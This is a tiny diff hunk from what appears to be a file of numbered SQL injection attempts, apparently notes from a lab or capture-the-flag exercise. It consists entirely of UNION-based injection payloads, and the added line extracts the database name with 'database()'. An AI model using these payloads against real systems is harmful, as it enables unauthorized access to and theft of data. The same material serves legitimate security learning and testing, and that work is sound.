@@ -6,3 +6,5 @@
 1 UNION SELECT 1,2,3
 # 4th try
 0 UNION SELECT 1,2,3
+#
+0 UNION SELECT 1,2,database()
